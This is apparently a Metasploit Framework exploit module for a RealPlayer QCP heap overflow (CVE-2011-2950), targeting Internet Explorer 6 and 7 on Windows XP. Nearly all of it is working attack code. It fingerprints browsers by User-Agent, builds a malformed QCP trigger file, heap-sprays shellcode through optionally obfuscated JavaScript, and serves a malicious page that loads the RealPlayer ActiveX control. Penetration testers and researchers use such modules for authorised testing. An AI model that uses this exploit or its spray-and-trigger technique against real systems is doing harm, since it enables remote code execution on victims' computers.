##
# $Id: realplayer_qcp.rb 13745 2011-09-17 06:48:33Z sinn3r $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info={})
        super(update_info(info,
            'Name'        => "RealNetworks Realplayer QCP Parsing Heap Overflow",
            'Description' => %q{
                    This module exploits a heap overflow in Realplayer when handling a .QCP file.
                    The specific flaw exists within qcpfformat.dll. A static 256 byte buffer is
                    allocated on the heap and user-supplied data from the file is copied within a
                    memory copy loop.
 
                    This allows a remote attacker to execute arbitrary code running in the context
                    of the web browser via a .QCP file with a specially crafted "fmt" chunk.
                    At this moment this module exploits the flaw on Windows XP IE6, IE7.
                },
            'License'     => MSF_LICENSE,
            'Version'     => "$Revision: 13745 $",
            'Author'      =>
                [
                    'Sean de Regge', # Vulnerability discovery
                    'juan vazquez'   # Metasploit module
                ],
            'References' =>
                [
                    ['CVE', '2011-2950'],
                    ['OSVDB', '74549'],
                    ['BID', '49172'],
                    # ZDI advisory
                    ['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-11-265/'],
                    # Vendor advisory
                    ['URL', 'http://service.real.com/realplayer/security/08162011_player/en/'],
                    #Fix commit
                    ['URL', 'http://lists.helixcommunity.org/pipermail/datatype-cvs/2011-April/015469.html'],
                ],
            'Payload' =>
                {
                    'Space' => 1024
                },
            'DefaultOptions' =>
                {
                    'ExitFunction' => "process",
                    'InitialAutoRunScript' => 'migrate -f'
                },
            'Platform' => 'win',
            'Targets'  =>
                [
                    [ 'Automatic', {} ],
                    [ 'Internet Explorer 6 on XP SP3', { 'Nops' => "%u1414%u1414" } ],
                    [ 'Internet Explorer 7 on XP SP3', { 'Nops' => "%u0c0c%u0c0c" } ],
                ],
            'DisclosureDate' => "Aug 16 2011",
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])
            ], self.class)
    end
 
    def get_target(cli, request)
        #Default target
        my_target = target
 
        vprint_status("User-Agent: #{request.headers['User-Agent']}")
 
        if target.name == 'Automatic'
            agent = request.headers['User-Agent']
            if agent =~ /NT 5\.1/ and agent =~ /MSIE 6\.0/
                #Windows XP + IE 6
                my_target = targets[1]
            elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7\.0/
                #Windows XP + IE 7.0
                my_target = targets[2]
            elsif agent =~ /RMA/
                #RealPlayer identifies itself as "RMA/1.0 (compatible; RealMedia)"
                #when requesting our trigger file
                return 'RMA'
            else
                #If we don't recognize the client, we don't fire the exploit
                my_target = nil
            end
        end
 
        return my_target
    end
 
    def exploit
        #Set trigger file name
        @filename = rand_text_alpha(rand(6) + 3)
        #Create the trigger file
        @trigger = build_trigger
        super
    end
 
    def on_request_uri(cli, request)
        #Pick the right target
        vprint_status("Selecting target...")
        my_target = get_target(cli, request)
        if my_target.nil?
            print_error("Target not supported")
            send_not_found(cli)
            return
        end
 
        vprint_status("URL: #{request.uri.to_s}")
 
        #Send the trigger file upon request
        if request.uri.match(/\.qcp$/)
            print_status("Sending trigger file to #{cli.peerhost}:#{cli.peerport}")
            send_response(cli, @trigger, { 'Content-Type' => 'application/octet-stream' })
            return
        end
 
        vprint_status("Building shellcode...")
        code = Rex::Text.to_unescape(payload.encoded)
 
        vprint_status("Building spray...")
        spray = build_spray(my_target, code)
 
        #obfuscate on demand
        vprint_status("Obfuscating javascript...")
        if datastore['OBFUSCATE']
            spray = Rex::Exploitation::JSObfu.new(spray)
            spray.obfuscate
        end
 
        vprint_status("Building html...")
        #Value for the 'Src' parameter of our ActiveX control
        trigger_file = ""
        if ("/" == get_resource[-1,1])
            trigger_file = get_resource[0, get_resource.length - 1]
        else
            trigger_file = get_resource
        end
        trigger_file << "/#{@filename}.qcp"
 
 
        html = <<-EOS
        <HTML>
        <HEAD>
        </HEAD>
        <BODY>
        <script language='javascript'>
        #{spray}
        </script>
        <OBJECT ID=RVOCX CLASSID="clsid:CFCDAA03-8BE4-11cf-B84B-0020AFBBCCFA" WIDTH=320 HEIGHT=240>
        <PARAM NAME="SRC" VALUE="#{trigger_file}">
        <PARAM NAME="CONTROLS" VALUE="ImageWindow">
        <PARAM NAME="CONSOLE" VALUE="one">
        <PARAM NAME="AUTOSTART" VALUE="true">
        <EMBED SRC="#{trigger_file}" WIDTH=320 HEIGHT=240 NOJAVA=true CONTROLS=ImageWindow CONSOLE=one AUTOSTART=true>
        </OBJECT>
        </BODY>
        EOS
 
        print_status("Sending malicious page to #{cli.peerhost}:#{cli.peerport}...")
        send_response( cli, html, {'Content-Type' => 'text/html'} )
    end
 
    def build_trigger()
        overflow_size = 700
        overflow_string = "\x11" * 700
 
        #riff_mark
        trigger = "\x52\x49\x46\x46"
        #total_size
        trigger << [0xed44 + overflow_size].pack("V")
        #qlcm_tag
        trigger << "\x51\x4c\x43\x4d"
        #fmt_tag
        trigger << "\x66\x6d\x74\x20"
        #fmt_size
        trigger << [0x96 + overflow_size].pack("V")
        #fmt_content
        trigger << "\x01\x00\x8d\xd4\x89\xe6\x76\x90"
        trigger << "\xb5\x46\x91\xef\x73\x6a\x51\x00"
        trigger << "\xce\xb4\x01\x00\x54\x49\x41\x20"
        trigger << "\x49\x53\x2d\x31\x32\x37\x20\x45"
        trigger << "\x6e\x68\x61\x6e\x63\x65\x64\x20"
        trigger << "\x56\x61\x72\x69\x61\x62\x6c\x65"
        trigger << "\x20\x52\x61\x74\x65\x20\x43\x6f"
        trigger << "\x64\x65\x63\x2c\x20\x53\x70\x65"
        trigger << "\x65\x63\x68\x20\x53\x65\x72\x76"
        trigger << "\x69\x63\x65\x20\x4f\x70\x74\x69"
        trigger << "\x6f\x6e\x20\x33\x20\x00\x00\x00"
        trigger << "\x00\x00\x00\x00\x00\x00\x00\x00"
        trigger << "\x00\x00\x00\x00\xc8\x32\x16\x00"
        trigger << "\xa0\x00\x40\x1f\x10\x00\x05\x00"
        trigger << "\x00\x00\x16\x04\x0a\x03\x05\x02"
        trigger << "\x02\x01\x00\x00\x00\x00\x00\x00"
        trigger << "\x00\x00\x00\x00\x00\x00\x00\x00"
        trigger << "\x00\x00\x00\x00\x00\x00\x00\x00"
        trigger << "\x00\x00\x00\x00\x00\x00"
        trigger << overflow_string
        #vrat_tag
        trigger << "\x76\x72\x61\x74"
        #vrat_size
        trigger << [0x8].pack("V")
        #vrat_content
        trigger << "\x01\x00\x00\x00\x06\x13\x00\x00"
        #data_tag
        trigger << "\x64\x61\x74\x61"
        #data_size
        trigger << [0xec8a].pack("V")
        #data_content
        trigger << rand_text_alpha(0xec8a)
        return trigger
    end
 
    def build_spray(mytarget, code)
        spray = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
 
        var code = unescape("#{code}");
        var nops = unescape("#{mytarget['Nops']}");
 
        while (nops.length < 0x10000) nops += nops;
        offset = nops.substring(0, 0x7BE0);
        var shellcode = offset + code + nops.substring(0, 0x8000-offset.length-code.length);
 
        while (shellcode.length < 0x20000) shellcode += shellcode;
        block = shellcode.substring(0, (0x10000-6)/2);
 
        heap_obj.gc();
 
        for (var i=0; i < 0x1400; i++) {
            heap_obj.alloc(block);
        }
        JS
 
        spray = heaplib(spray)
        return spray
    end
 
end
